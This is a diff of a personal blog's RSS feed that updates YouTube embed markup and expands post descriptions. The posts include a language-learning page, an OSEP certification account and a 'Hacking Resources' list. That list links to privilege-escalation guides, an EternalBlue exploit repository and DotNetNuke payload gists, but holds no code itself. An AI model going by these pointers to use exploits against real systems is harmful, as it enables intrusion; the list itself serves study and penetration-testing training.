-  <iframe src="https://www.youtube.com/embed/ymoWu-K8jZg" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
-</div>
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/ymoWu-K8jZg?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
+    </div>
 
 <h3 id="nördarnas-jul">Nördarnas Jul</h3>
-
 <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
-  <iframe src="https://www.youtube.com/embed/K5mwJHMsAXE" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
-</div>
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/K5mwJHMsAXE?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
+    </div>
 
 <h2 id="polyglott">Polyglott</h2>
 <h3 id="steve-kaufmann---lingosteve">Steve Kaufmann - lingosteve</h3>
-
 <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
-  <iframe src="https://www.youtube.com/embed/PvT3c0ljWtw" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
-</div>
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/PvT3c0ljWtw?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
+    </div>
 
 <h3 id="olly-richards">Olly Richards</h3>
-
 <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
-  <iframe src="https://www.youtube.com/embed/GhzwmN31AGo" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
-</div>
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/GhzwmN31AGo?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
+    </div>
 
 <h3 id="wouter-cordwuener">Wouter Cordwuener</h3>
-
 <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
-  <iframe src="https://www.youtube.com/embed/LmWYFhTdkRY" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
-</div>
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/LmWYFhTdkRY?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
+    </div>
 
 <h1 id="böcker">Böcker</h1>
 <h2 id="short-stories-in-swedish-for-beginners-teach-yourself">Short Stories in Swedish for Beginners (Teach Yourself)</h2>
@@ -336,7 +335,12 @@ Faktiskt jag läser på &ldquo;Harry Potter - Och De Vises Sten&rdquo; (jag har 
 <pre tabindex="0"><code class="language-textinfo" data-lang="textinfo">https://www.deepl.com/
 </code></pre><h2 id="google-translate">Google Translate</h2>
 <pre tabindex="0"><code class="language-textinfo" data-lang="textinfo">https://translate.google.com/
-</code></pre>]]></content></item><item><title>Three is Company: My adventure getting OSEP towards landing OSCE3</title><link>https://ceso.github.io/posts/2022/01/three-is-company-my-adventure-getting-osep-towards-landing-osce3/</link><pubDate>Tue, 25 Jan 2022 00:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2022/01/three-is-company-my-adventure-getting-osep-towards-landing-osce3/</guid><description>Preface Twenty months have passed since ceso obtained his OSCP and just now in January/2022 got his OSEP, during this time he traveled from the old continent back to his hometown on the other side of the world as there was stuff he needed to sort out. Covid-19 (c-19), the pandemic that started in 2020, was still leaving havoc behind any place where it arrived, and the situation didn&amp;rsquo;t look like getting better any soon.</description><content type="html"><![CDATA[
+</code></pre>]]></content></item><item><title>Three is Company: My adventure getting OSEP towards landing OSCE3</title><link>https://ceso.github.io/posts/2022/01/three-is-company-my-adventure-getting-osep-towards-landing-osce3/</link><pubDate>Tue, 25 Jan 2022 00:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2022/01/three-is-company-my-adventure-getting-osep-towards-landing-osce3/</guid><description>&lt;img src="https://ceso.github.io/images/blog/osep/osep_banner.png" class="center" style="border-radius: 8px;" />
+&lt;h2 id="preface">Preface&lt;/h2>
+&lt;p>Twenty months have passed since ceso obtained his OSCP and just now in January/2022 got his OSEP, during this time he traveled from the old continent back to his hometown on the other side of the world as there was stuff he needed to sort out. Covid-19 (c-19), the pandemic that started in 2020, was still leaving havoc behind any place where it arrived, and the situation didn&amp;rsquo;t look like getting better any soon. His travel back was not the easiest one as it used to be before the c-19 attacked but still, as it was he was able to return without facing odds.
+Ceso saved some money and made ambitious objectives when it was still 2021; &amp;ldquo;I will get OSCE3!!!&amp;rdquo;, but&amp;hellip;stuff doesn&amp;rsquo;t always go as expected or how we want, and his life started to go downhill in some aspects of his life, health started to be quite
+an issue and all his plans needed to be pushed aside and improving his health turned the top priority.
+Months passed and as he started to feel better, August of 2021 was running and decided it was time, he was ready to continue where he left, time to pick up before all started going downhill; time to go after OSEP and defeat it and the bosses that will be coming afterward (OSWE and OSED).&lt;/p></description><content type="html"><![CDATA[
     <img src="/images/blog/osep/osep_banner.png"  class="center"  style="border-radius: 8px;"  />
 
 
@@ -393,8 +397,7 @@ By the end of the 48 hs completed, I only managed to get up to 60 points (6 flag
 <p>On OSCP I did my note-taking leveraging Cherytree, it has had some complaints from people in the past as files got corrupt and all was lost. Even if there is 10 type of people: those who back up, and those who wish they did, I didn&rsquo;t want to put myself at that risk, so I started looking after some nice tools which allowed me to do note-taking in markdown, tried Obsidian, Triskel and Jopling, BUT none of these I liked them, nothing wrong with them but I can&rsquo;t deal with the fact of a text editor using Javascript, it ends up wasting a LOT of resources, and is just&hellip;a text editor, from my pov is nonsense so I kept moving, feeling unhappy as I couldn&rsquo;t find ANY text editor which made me feel ok and didn&rsquo;t consume an obscene amount of resources for such a simple task, at some point <a href="https://fideo.info/">fcr</a> recommended me to try out Zim, and well, there wasn&rsquo;t a come back from it, I fall in love with this editor.</p>
 <p>First of all, <a href="https://zim-wiki.org/">you can find zim here</a>, now what is it? Just from their page:</p>
 <blockquote>
-<p>Zim is a graphical text editor used to maintain a collection of wiki pages. Each page can contain links to other pages, simple formatting and images. Pages are stored in a folder structure, like in an outliner, and can have attachments. Creating a new page is as easy as linking to a nonexistent page. All data is stored in plain text files with wiki formatting. Various plugins provide additional functionality, like a task list manager, an equation editor, a tray icon, and support for version control.</p>
-</blockquote>
+<p>Zim is a graphical text editor used to maintain a collection of wiki pages. Each page can contain links to other pages, simple formatting and images. Pages are stored in a folder structure, like in an outliner, and can have attachments. Creating a new page is as easy as linking to a nonexistent page. All data is stored in plain text files with wiki formatting. Various plugins provide additional functionality, like a task list manager, an equation editor, a tray icon, and support for version control.</p></blockquote>
 <p>Zim is just AWESOME! It has everything you need and more without neither compromising performance nor being complex to use, is extremely easy and comfortable to navigate around it, every file is a .txt and generating templates is just easy as creating a .txt with the base you want and copy/past it in the desired location post a &ldquo;Tools -&gt; Update-Index&rdquo;, it supports Version Control integration with Git/Bazaar/Mercurial, on top of this you can expand its functionalities through plugins and it also looks amazing.</p>
 <p>Below is a screenshot of what Zim looks like:</p>
 
@@ -442,39 +445,43 @@ Now, I wanna tell you that if you fail your 1st attempt or the N-th it is, I can
 
 <p>And beyond Offsec, I also would like to learn more about Evasion, specifically start poking into EDR/XDR evasion which read/watched a bit, looks awesome but didn&rsquo;t play around. The same thing goes for doing Malware Analysis which I found out for example <a href="https://samsclass.info/126/126_F21.shtml">this course</a> (more resources again, into the <a href="https://ceso.github.io/posts/2020/12/hacking-resources/">resources section of my blog</a>).</p>
 <p>Said all of this, again thanks for reading if you did, hope you didn&rsquo;t suffer THAT much by doing it, and: keep learning!!!</p>
-]]></content></item><item><title>My Videos</title><link>https://ceso.github.io/posts/2021/03/my-videos/</link><pubDate>Sun, 07 Mar 2021 02:30:30 +0000</pubDate><guid>https://ceso.github.io/posts/2021/03/my-videos/</guid><description>My Videos A compilation of videos from Presentations/Live Streamings given by me.
-Simulation of OSCP with Hack The Box and VulnHub machines Apr 11, 2020
-Live streaming I did of a simulation of the OSCP Exam with HTB Machines + a Vulnhub machine (BOF), this is video is complemented with my post A Journey in the Dark - An adventure&amp;rsquo;s tale towards OSCP
-HTB NL Meetup 03 - And we start our journey Jun 17, 2020</description><content type="html"><![CDATA[<h1 id="my-videos">My Videos</h1>
+]]></content></item><item><title>My Videos</title><link>https://ceso.github.io/posts/2021/03/my-videos/</link><pubDate>Sun, 07 Mar 2021 02:30:30 +0000</pubDate><guid>https://ceso.github.io/posts/2021/03/my-videos/</guid><description>&lt;h1 id="my-videos">My Videos&lt;/h1>
+&lt;p>A compilation of videos from Presentations/Live Streamings given by me.&lt;/p>
+&lt;h2 id="simulation-of-oscp-with-hack-the-box-and-vulnhub-machines">Simulation of OSCP with Hack The Box and VulnHub machines&lt;/h2>
+&lt;p>Apr 11, 2020&lt;/p>
+&lt;p>Live streaming I did of a simulation of the OSCP Exam with HTB Machines + a Vulnhub machine (BOF), this is video is complemented with my post &lt;a href="https://ceso.github.io/posts/2020/04/a-journey-in-the-dark-an-adventures-tale-towards-oscp/">A Journey in the Dark - An adventure&amp;rsquo;s tale towards OSCP&lt;/a>&lt;/p>
+&lt;div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+&lt;iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/FwZc6JigIcE?autoplay=0&amp;amp;controls=1&amp;amp;end=0&amp;amp;loop=0&amp;amp;mute=0&amp;amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video">&lt;/iframe>
+&lt;/div>
+&lt;h2 id="htb-nl-meetup-03---and-we-start-our-journey">HTB NL Meetup 03 - And we start our journey&lt;/h2>
+&lt;p>Jun 17, 2020&lt;/p></description><content type="html"><![CDATA[<h1 id="my-videos">My Videos</h1>
 <p>A compilation of videos from Presentations/Live Streamings given by me.</p>
 <h2 id="simulation-of-oscp-with-hack-the-box-and-vulnhub-machines">Simulation of OSCP with Hack The Box and VulnHub machines</h2>
 <p>Apr 11, 2020</p>
 <p>Live streaming I did of a simulation of the OSCP Exam with HTB Machines + a Vulnhub machine (BOF), this is video is complemented with my post <a href="https://ceso.github.io/posts/2020/04/a-journey-in-the-dark-an-adventures-tale-towards-oscp/">A Journey in the Dark - An adventure&rsquo;s tale towards OSCP</a></p>
-
 <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
-  <iframe src="https://www.youtube.com/embed/FwZc6JigIcE" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
-</div>
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/FwZc6JigIcE?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
+    </div>
 
 <h2 id="htb-nl-meetup-03---and-we-start-our-journey">HTB NL Meetup 03 - And we start our journey</h2>
 <p>Jun 17, 2020</p>
 <p>Presentation I gave at the <a href="https://hackdewereld.nl/posts/0x03-we-start-our-journey/">Dutch Hack The Box meetup</a> after passing my OSCP. Talking a bit about my background, and what I do consider is some of the knowledge pre-needed, and how to approach the studying of the exam, etc.</p>
-
 <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
-  <iframe src="https://www.youtube.com/embed/u9ENKjDNQBA" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
-</div>
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/u9ENKjDNQBA?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
+    </div>
 
 <p>The code of the presentation can be found here:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>https://github.com/ceso/presentations/tree/master/meetup_nl_20200617_starting
 </span></span></code></pre></div><h2 id="learning-aws-security-with-flawscloud">Learning AWS Security with flaws.cloud</h2>
 <p>Mar 7, 2021</p>
 <p>Live streaming I gave at twitch going through the challenges at flaws.cloud as a way to learn a little bit about security on AWS.</p>
-
 <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
-  <iframe src="https://www.youtube.com/embed/8wy0WqfRIjc" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
-</div>
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/8wy0WqfRIjc?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
+    </div>
 
-]]></content></item><item><title>Q3liZXJzZWMgbXkgd2F 5IC0gUGFydCAxCg==</title><link>https://ceso.github.io/posts/2021/02/q3lizxjzzwmgbxkgd2f-5ic0gugfydcaxcg/</link><pubDate>Sun, 14 Feb 2021 16:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2021/02/q3lizxjzzwmgbxkgd2f-5ic0gugfydcaxcg/</guid><description>Preface Lot of things have happend since the last time I posted something here, such as moving back to my country at the middle of last year to also stopping studying for some months due prioritizing my mental health (2020 was a bitch to all of us).
-I already talked a bit about my background and how I started to study Cybersec in my prior post related to my experience with OSCP, you can go there and read about it if you want, but I will repeat some stuff here.</description><content type="html"><![CDATA[<h2 id="preface">Preface</h2>
+]]></content></item><item><title>Q3liZXJzZWMgbXkgd2F 5IC0gUGFydCAxCg==</title><link>https://ceso.github.io/posts/2021/02/q3lizxjzzwmgbxkgd2f-5ic0gugfydcaxcg/</link><pubDate>Sun, 14 Feb 2021 16:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2021/02/q3lizxjzzwmgbxkgd2f-5ic0gugfydcaxcg/</guid><description>&lt;h2 id="preface">Preface&lt;/h2>
+&lt;p>Lot of things have happend since the last time I posted something here, such as moving back to my country at the middle of last year to also stopping studying for some months due prioritizing my mental health (2020 was a bitch to all of us).&lt;/p>
+&lt;p>&lt;em>&lt;strong>I already talked a bit about my background and how I started to study Cybersec in my prior post related to &lt;a href="https://ceso.github.io/posts/2020/04/a-journey-in-the-dark-an-adventures-tale-towards-oscp/">my experience with OSCP&lt;/a>, you can go there and read about it if you want, but I will repeat some stuff here.&lt;/strong>&lt;/em>&lt;/p></description><content type="html"><![CDATA[<h2 id="preface">Preface</h2>
 <p>Lot of things have happend since the last time I posted something here, such as moving back to my country at the middle of last year to also stopping studying for some months due prioritizing my mental health (2020 was a bitch to all of us).</p>
 <p><em><strong>I already talked a bit about my background and how I started to study Cybersec in my prior post related to <a href="https://ceso.github.io/posts/2020/04/a-journey-in-the-dark-an-adventures-tale-towards-oscp/">my experience with OSCP</a>, you can go there and read about it if you want, but I will repeat some stuff here.</strong></em></p>
 <p>Well! This post will be an insight about how I&rsquo;m learning Cybersec, at the moment, tools I use, channels Im watching, how I&rsquo;m practicing, etc, said all of this&hellip;let&rsquo;s jump in!</p>
@@ -594,8 +601,290 @@ Once is published, I&rsquo;m thinking on getting <a href="https://www.bookdeposi
 <p>I more or less talked about my way to learn stuff, and how I&rsquo;m approaching Cybersec at the moment as how I&rsquo;m thinking to approach it in the future (as well, domains of knowledge I&rsquo;m interested on).
 Due my daily work isn&rsquo;t anything related to Pentest/Offensive Attacks (again, I&rsquo;m working as a Sysadmin/DevOps), the labs I mentioned and Bug Bounties (production environments) are my way at this moment to get some hands-on experience, and I will keep with them but with the aim to moving to a Cybersec position in the future.</p>
 <p>All of that said, thanks if you read until this point, I will be doing a live stream talking about this as well and will update the post with the link, cya!!!</p>
-]]></content></item><item><title>Hacking Resources</title><link>https://ceso.github.io/posts/2020/12/hacking-resources/</link><pubDate>Fri, 04 Dec 2020 00:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2020/12/hacking-resources/</guid><description>Hacking Resources This isn&amp;rsquo;t more than another hacking resources list. I basically throw here every resource I get interested on taking a look/playing with it, or stuff that I use as a reference while trying to break something.
-Usefull Web Browser plugins https://www.wappalyzer.com/download/ https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/ &amp;lt;&amp;mdash;&amp;mdash; For Firefox https://chrome.google.com/webstore/detail/foxyproxy-standard/gcknhkkoolaabfmlnjonogaaifnjlfnp &amp;lt;&amp;mdash;&amp;mdash; For Chrome https://cookie-editor.cgagnier.ca/#download https://addons.mozilla.org/en-US/firefox/addon/multi-account-containers/ Cool Tools/Labs https://hackthebox.eu/ https://www.vulnhub.com/ https://www.blacklanternsecurity.com/2020-12-02-WriteHat/ https://github.com/madhuakula/kubernetes-goat https://github.com/m8r0wn/ActiveReign https://github.com/sundowndev/PhoneInfoga https://github.com/GoSecure/dtd-finder https://www.shodan.io/ https://crt.sh/ https://censys.io/ https://dnsdumpster.com/ https://mxtoolbox.com/ https://github.com/OWASP/owasp-mstg/tree/master/Crackmes https://github.com/oversecured/ovaa https://github.com/OWASP/NodeGoat https://owasp.</description><content type="html"><![CDATA[<h1 id="hacking-resources">Hacking Resources</h1>
+]]></content></item><item><title>Hacking Resources</title><link>https://ceso.github.io/posts/2020/12/hacking-resources/</link><pubDate>Fri, 04 Dec 2020 00:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2020/12/hacking-resources/</guid><description>&lt;h1 id="hacking-resources">Hacking Resources&lt;/h1>
+&lt;p>This isn&amp;rsquo;t more than another hacking resources list. I basically throw here every resource I get interested on taking a look/playing with it, or stuff that I use as a reference while trying to break something.&lt;/p>
+&lt;h4 id="usefull-web-browser-plugins">Usefull Web Browser plugins&lt;/h4>
+&lt;ul>
+&lt;li>&lt;a href="https://www.wappalyzer.com/download/">https://www.wappalyzer.com/download/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/">https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/&lt;/a> &lt;strong>&amp;lt;&amp;mdash;&amp;mdash; For Firefox&lt;/strong>&lt;/li>
+&lt;li>&lt;a href="https://chrome.google.com/webstore/detail/foxyproxy-standard/gcknhkkoolaabfmlnjonogaaifnjlfnp">https://chrome.google.com/webstore/detail/foxyproxy-standard/gcknhkkoolaabfmlnjonogaaifnjlfnp&lt;/a> &lt;strong>&amp;lt;&amp;mdash;&amp;mdash; For Chrome&lt;/strong>&lt;/li>
+&lt;li>&lt;a href="https://cookie-editor.cgagnier.ca/#download">https://cookie-editor.cgagnier.ca/#download&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://addons.mozilla.org/en-US/firefox/addon/multi-account-containers/">https://addons.mozilla.org/en-US/firefox/addon/multi-account-containers/&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h4 id="cool-toolslabs">Cool Tools/Labs&lt;/h4>
+&lt;ul>
+&lt;li>&lt;a href="https://hackthebox.eu/">https://hackthebox.eu/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.vulnhub.com/">https://www.vulnhub.com/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.blacklanternsecurity.com/2020-12-02-WriteHat/">https://www.blacklanternsecurity.com/2020-12-02-WriteHat/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/madhuakula/kubernetes-goat">https://github.com/madhuakula/kubernetes-goat&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/m8r0wn/ActiveReign">https://github.com/m8r0wn/ActiveReign&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/sundowndev/PhoneInfoga">https://github.com/sundowndev/PhoneInfoga&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/GoSecure/dtd-finder">https://github.com/GoSecure/dtd-finder&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.shodan.io/">https://www.shodan.io/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://crt.sh/">https://crt.sh/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://censys.io/">https://censys.io/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://dnsdumpster.com/">https://dnsdumpster.com/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://mxtoolbox.com/">https://mxtoolbox.com/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/OWASP/owasp-mstg/tree/master/Crackmes">https://github.com/OWASP/owasp-mstg/tree/master/Crackmes&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/oversecured/ovaa">https://github.com/oversecured/ovaa&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/OWASP/NodeGoat">https://github.com/OWASP/NodeGoat&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://owasp.org/www-project-juice-shop/">https://owasp.org/www-project-juice-shop/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://portswigger.net/web-security">https://portswigger.net/web-security&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/bee-san/pyWhat">https://github.com/bee-san/pyWhat&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h4 id="linux-privilege-escalation">Linux Privilege Escalation&lt;/h4>
+&lt;ul>
+&lt;li>&lt;a href="https://gtfobins.github.io/">https://gtfobins.github.io/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation">https://book.hacktricks.xyz/linux-unix/privilege-escalation&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://guif.re/linuxeop">https://guif.re/linuxeop&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.win.tue.nl/~aeb/linux/hh/hh-8.html">https://www.win.tue.nl/~aeb/linux/hh/hh-8.html&lt;/a>&lt;/li>
+&lt;li>&lt;a href="http://www.dankalia.com/tutor/01005/0100501004.htm">http://www.dankalia.com/tutor/01005/0100501004.htm&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://blog.ikuamike.io/posts/2021/package_managers_privesc/">https://blog.ikuamike.io/posts/2021/package_managers_privesc/&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h4 id="windows-privilege-escalation">Windows Privilege Escalation&lt;/h4>
+&lt;ul>
+&lt;li>&lt;a href="https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/">https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="http://www.fuzzysecurity.com/tutorials/16.html">http://www.fuzzysecurity.com/tutorials/16.html&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/J3rryBl4nks/LPEWalkthrough/blob/master/Walkthrough.md">https://github.com/J3rryBl4nks/LPEWalkthrough/blob/master/Walkthrough.md&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/worawit/MS17-010">https://github.com/worawit/MS17-010&lt;/a> &lt;strong>&amp;lt;&amp;mdash;&amp;mdash; Eternal blue without MSF&lt;/strong>&lt;/li>
+&lt;li>&lt;a href="https://github.com/ankh2054/windows-pentest">https://github.com/ankh2054/windows-pentest&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html">https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html">https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/frizb/Windows-Privilege-Escalation">https://github.com/frizb/Windows-Privilege-Escalation&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h4 id="windows-stuff">Windows stuff&lt;/h4>
+&lt;ul>
+&lt;li>&lt;a href="http://www.cheat-sheets.org/saved-copy/Windows_folders_quickref.pdf">http://www.cheat-sheets.org/saved-copy/Windows_folders_quickref.pdf&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.lemoda.net/windows/windows2unix/windows2unix.html">https://www.lemoda.net/windows/windows2unix/windows2unix.html&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html">https://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/">https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html">https://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://malicious.link/post/2016/kerberoast-pt1/">https://malicious.link/post/2016/kerberoast-pt1/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://gist.github.com/pwntester/72f76441901c91b25ee7922df5a8a9e4">https://gist.github.com/pwntester/72f76441901c91b25ee7922df5a8a9e4&lt;/a> &lt;strong>&amp;lt;&amp;mdash; DotNetNuke (CVE-2017-9822) Payloads&lt;/strong>&lt;/li>
+&lt;/ul>
+&lt;h4 id="powershell">Powershell&lt;/h4>
+&lt;ul>
+&lt;li>&lt;a href="https://vipulvyas0813.medium.com/introduction-to-powershell-for-penetration-testing-733236bc9547">https://vipulvyas0813.medium.com/introduction-to-powershell-for-penetration-testing-733236bc9547&lt;/a> &lt;strong>&amp;lt;&amp;mdash;&amp;mdash; Serie about Poershell for Penetration Testing (5 posts)&lt;/strong>&lt;/li>
+&lt;/ul>
+&lt;h4 id="linux-stuff">Linux stuff&lt;/h4>
+&lt;ul>
+&lt;li>&lt;a href="http://www.pathname.com/fhs/pub/fhs-2.3.html">http://www.pathname.com/fhs/pub/fhs-2.3.html&lt;/a>&lt;/li>
+&lt;li>&lt;a href="http://www.linusakesson.net/programming/tty/">http://www.linusakesson.net/programming/tty/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="http://pentestmonkey.net/blog/post-exploitation-without-a-tty">http://pentestmonkey.net/blog/post-exploitation-without-a-tty&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h4 id="pivoting">Pivoting&lt;/h4>
+&lt;ul>
+&lt;li>&lt;a href="https://artkond.com/2017/03/23/pivoting-guide/">https://artkond.com/2017/03/23/pivoting-guide/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://nullsweep.com/pivot-cheatsheet-for-pentesters/">https://nullsweep.com/pivot-cheatsheet-for-pentesters/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html">https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h4 id="brute-forcecracking">Brute force/Cracking&lt;/h4>
+&lt;ul>
+&lt;li>&lt;a href="https://github.com/Coalfire-Research/npk">https://github.com/Coalfire-Research/npk&lt;/a> &lt;strong>&amp;lt;&amp;mdash;&amp;mdash; Distributed hash-cracking platform on serverless AWS componentes&lt;/strong>&lt;/li>
+&lt;li>&lt;a href="https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/rapid7/ssh-badkeys">https://github.com/rapid7/ssh-badkeys&lt;/a>&lt;/li>
